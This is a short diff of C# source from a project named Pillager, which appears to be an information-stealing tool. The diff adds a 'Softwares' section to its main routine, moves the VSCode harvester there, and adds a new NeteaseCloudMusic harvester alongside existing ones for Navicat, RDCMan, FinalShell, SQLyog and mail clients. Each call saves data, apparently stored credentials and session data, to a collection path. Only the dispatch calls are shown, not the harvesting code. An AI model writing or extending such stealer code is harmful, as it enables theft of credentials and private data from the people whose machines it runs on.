@@ -5,6 +5,7 @@ using Pillager.Helper;
 using Pillager.Mails;
 using Pillager.Messengers;
 using Pillager.Others;
+using Pillager.Softwares;
 using Pillager.Tools;
 
 namespace Pillager
@@ -39,8 +40,11 @@ namespace Pillager
             Navicat.Save(savepath);
             RDCMan.Save(savepath);
             FinalShell.Save(savepath);
-            VSCode.Save(savepath);
             SQLyog.Save(savepath);
+
+            //Softwares
+            VSCode.Save(savepath);
+            NeteaseCloudMusic.Save(savepath);
 
             //Mail
             MailMaster.Save(savepath);
